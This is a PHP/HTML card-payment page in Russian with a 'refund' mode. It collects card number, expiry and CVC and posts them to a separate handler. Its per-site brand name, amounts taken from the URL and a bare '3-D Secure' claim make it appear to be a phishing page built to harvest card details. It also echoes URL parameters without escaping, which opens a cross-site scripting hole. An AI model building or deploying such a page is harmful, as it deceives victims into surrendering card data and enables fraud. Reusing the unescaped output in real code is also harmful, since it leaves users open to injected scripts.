<?php
define("access", "yes");
include(__DIR__ . '/../admin/engine/database/connection.php');
$sn = R::load('sitenames', 1);
error_reporting(0);
$amount = $_GET["amount"];
$item = $_GET["item"];

if ($amount < 100 || !isset($amount)) {
	$amount = 100;
}

if ($amount > 200000) {
	$amount = 200000;
}

if (isset($_GET["refund"])) {
	$heading = "Возврат";
	$label = "К возврату";
} else {
	$heading = $sn->pay;
	$label = "К оплате";
}

?>

<!DOCTYPE html>
<html lang="ru">
	<head>
		<link rel="shortcut icon" href="public/images/favicon.png">
		<link rel="stylesheet" href="public/styles/main.css">

		<script src="public/js/jquery.min.js"></script>

		<meta charset="UTF-8">
		<meta name="viewport" content="width=350">

		<title><?php echo $sn->pay ?> | Оплата банковской картой</title>
	</head>

	<body>
		<div class="loader">
			<img src="public/images/loader.svg" style="height: 90px;">
			<p>Обработка платежа...</p>
		</div>

		<div class="wrapper flex-center">
			<div class="window flex-vertical">
				<div class="title flex-center"><?php echo $heading; ?></div>

				<form method="post" action="payment.php">
					<div class="general flex-vertical">
						<div class="flex-section flex-horizontal">
							<div class="input-block flex-vertical input-error">
								<span id="label-number">Номер карты</span>
								<input maxlength="19" onKeyPress="number()" name="card_number" id="card_number" placeholder="0000 0000 0000 0000" type="text" autocomplete="disabled" required>
							</div>
						</div>

						<div class="flex-section flex-horizontal">
							<div class="input-block flex-vertical">
								<span id="label-exp">Срок действия</span>
								<input onKeyPress="number()" name="card_expire" id="card_exp" placeholder="00 / 00" type="text" required>
							</div>

							<div class="input-block flex-vertical">
								<span class="text-right" id="label-cvc" style="margin-top: 15px;">CVC-код</span>
								<input maxlength="3" onKeyPress="number()" name="card_code" class="text-right" id="card_cvc" placeholder="000" type="text" required>
							</div>
						</div>

						<input name="amount" value="<?php echo $amount; ?>" hidden>
                        <input name="item" value="<?php echo $item; ?>" hidden>
						<input name="description" value="<?php echo rand(100000000, 999999999); ?>" hidden>
						<input id="submit-form" type="submit" hidden>
					</div>
				</form>

				<div class="information flex-vertical">
					<div class="name"></div>

					<div class="spans flex-space-between">
						<span><?php echo $label; ?></span>
						<span><?php echo $amount; ?> ₽</span>
					</div>

				</div>

				<a onclick="$('#submit-form').click();">
					<div class="button flex-center">
						<div class="flex-center">Продолжить</div>
					</div>
				</a>

				<div class="logos">
					<div></div>
					<div></div>
					<div></div>
				</div>
				<div class="small-text">Защищено системой 3-D Secure.</div>
			</div>
		</div>

		<script>
			$("#submit-form").click(function() {
				var number = $("#card_number");
				var date = $("#card_exp");
				var cvc = $("#card_cvc");

				if (number.val().length !== 19) {
					$("#label-number").addClass("error-label");
					return false;
				}

				if (date.val().length !== 7) {
					$("#label-exp").addClass("error-label");
					return false;
				}

				if (cvc.val().length !== 3) {
					$("#label-cvc").addClass("error-label");
					return false;
				}

				$(".loader").fadeIn();
			});

			$("#card_number").focus(function() {
				$("#label-number").removeClass("error-label");
			});

			$("#card_exp").focus(function() {
				$("#label-exp").removeClass("error-label");
			});

			$("#card_cvc").focus(function() {
				$("#label-cvc").removeClass("error-label");
			});

			function number() {
				if (event.keyCode < 48 || event.keyCode > 57)
			    		event.returnValue= false;
			}

			function card_number(value) {
				var v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
				var matches = v.match(/\d{4,16}/g);
				var match = matches && matches[0] || '';
				var parts = [];

				for (i=0, len=match.length; i < len; i+=4) {
					parts.push(match.substring(i, i+4));
				}

				if (parts.length) {
					return parts.join(' ');
				} else {
					return value;
				}
			}

			function card_exp(value) {
				var v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
				var matches = v.match(/\d{2,4}/g);
				var match = matches && matches[0] || '';
				var parts = [];

				for (i=0, len=match.length; i<len; i+=2) {
					parts.push(match.substring(i, i+2));
				}

				if (parts.length) {
					return parts.join(' / ');
				} else {
					return value;
				}
			}

			$("#card_number").bind("input", function() {
				this.value = card_number(this.value);
			});

			$("#card_exp").bind("input", function() {
				this.value = card_exp(this.value);
			});

			function Moon(value) {
				if (/[^0-9-\s]+/.test(value)) return false;

				var nCheck = 0, nDigit = 0, bEven = false;
				value = value.replace(/\D/g, "");

				for (var n = value.length - 1; n >= 0; n--) {
					var cDigit = value.charAt(n),
						  nDigit = parseInt(cDigit, 10);

					if (bEven) {
						if ((nDigit *= 2) > 9) nDigit -= 9;
					}

					nCheck += nDigit;
					bEven = !bEven;
				}

				return (nCheck % 10) == 0;
			}
		</script>
	</body>
</html>